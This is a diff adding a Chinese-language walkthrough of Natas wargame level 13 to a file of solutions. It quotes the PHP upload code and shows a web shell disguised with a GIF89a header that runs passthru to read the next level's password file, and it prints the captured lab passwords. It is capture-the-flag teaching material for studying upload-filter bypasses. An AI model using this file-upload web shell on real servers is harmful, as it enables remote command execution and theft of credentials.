@@ -260,3 +260,33 @@ passthru("cat /etc/natas_webpass/natas13");
 ```text
 jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
 ```
+
+### Level13
+PHP源码，只贴与Level12不同的部分
+```php
+if(array_key_exists("filename", $_POST)) { 
+    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
+        echo "File is too big"; 
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
+        echo "File is not an image"; 
+    } else { 
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
+        } else{ 
+            echo "There was an error uploading the file, please try again!"; 
+        } 
+    } 
+}
+?> 
+```
+这次加了一个文件头的检测，于是我们加一个假的文件头，变成
+```php
+GIF89a
+<?
+passthru("cat /etc/natas_webpass/natas14");
+?>
+```
+之后访问上传上去的php页面得到natas14的密码(去掉开头的 `GIF89a ` )
+```text
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+```
